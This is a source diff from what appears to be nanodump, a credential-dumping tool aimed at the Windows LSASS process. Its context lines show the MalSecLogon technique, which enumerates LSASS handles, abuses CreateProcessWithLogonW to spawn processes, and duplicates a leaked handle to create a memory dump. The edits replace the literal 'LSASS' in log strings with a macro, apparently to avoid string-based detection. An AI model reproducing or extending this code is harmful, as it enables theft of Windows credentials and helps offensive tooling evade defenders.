@@ -9,7 +9,7 @@ PHANDLE_LIST find_process_handles_in_lsass(
 {
     BOOL success;
 
-    DPRINT("Finding handles in the LSASS process");
+    DPRINT("Finding handles in the " LSASS " process");
 
     PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
     if (!handle_list)
@@ -61,7 +61,7 @@ PHANDLE_LIST find_process_handles_in_lsass(
     }
 
     intFree(handleTableInformation); handleTableInformation = NULL;
-    DPRINT("Found %ld handles in LSASS", handle_list->Count);
+    DPRINT("Found %ld handles in " LSASS, handle_list->Count);
     return handle_list;
 }
 
@@ -191,7 +191,7 @@ BOOL MalSecLogon(
     PPROCESS_LIST created_processes;
     BOOL success;
 
-    DPRINT("Using MalSecLogon to get a handle to LSASS");
+    DPRINT("Using MalSecLogon to get a handle to " LSASS);
     PRINT("[!] MalSecLogon implementation is unstable, errors are to be expected");
     // if MalSecLogon is used to create other processes, save their PID
     if (!use_malseclogon_locally)
@@ -201,7 +201,7 @@ BOOL MalSecLogon(
         {
             *Pcreated_processes = NULL;
             malloc_failed();
-            DPRINT_ERR("Failed to get handle to LSASS using MalSecLogon");
+            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
             return FALSE;
         }
         *Pcreated_processes = created_processes;
@@ -275,14 +275,14 @@ BOOL malseclogon_stage_1(
     );
     if (!handle_list)
     {
-        DPRINT_ERR("Failed to get handle to LSASS using MalSecLogon");
+        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
         return FALSE;
     }
 
     if (handle_list->Count == 0)
     {
         PRINT_ERR(
-            "No handles found in LSASS, is the PID %ld correct?.",
+            "No handles found in " LSASS ", is the PID %ld correct?.",
             lsass_pid
         );
         intFree(handle_list); handle_list = NULL;
@@ -308,7 +308,7 @@ BOOL malseclogon_stage_1(
     if (!CreateProcessWithLogonW)
     {
         DPRINT_ERR("Address of 'CreateProcessWithLogonW' not found");
-        DPRINT_ERR("Failed to get handle to LSASS using MalSecLogon");
+        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
         intFree(handle_list); handle_list = NULL;
         return FALSE;
     }
@@ -348,7 +348,7 @@ BOOL malseclogon_stage_1(
         if (!success)
         {
             function_failed("CreateProcessWithLogonW");
-            DPRINT_ERR("Failed to get handle to LSASS using MalSecLogon");
+            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
             change_pid(original_pid, NULL);
             intFree(handle_list); handle_list = NULL;
             return FALSE;
@@ -366,7 +366,7 @@ BOOL malseclogon_stage_1(
         success = save_new_process_pid(process_list, procInfo.dwProcessId);
         if (!success)
         {
-            DPRINT_ERR("Failed to get handle to LSASS using MalSecLogon");
+            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
             change_pid(original_pid, NULL);
             intFree(handle_list); handle_list = NULL;
             return FALSE;
@@ -400,14 +400,14 @@ BOOL malseclogon_stage_1(
     {
         // the new nanodump process was unable to create the minidump
         DPRINT_ERR("The created nanodump process did not create the dump");
-        DPRINT_ERR("Failed to get handle to LSASS using MalSecLogon");
+        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
         return FALSE;
     }
     else
     {
         // all the processes with the leaked handles have been created
         DPRINT(
-            "Created %ld processes, trying to duplicate one of the leaked handles to LSASS",
+            "Created %ld processes, trying to duplicate one of the leaked handles to " LSASS,
             process_list->Count
         );
         return TRUE;
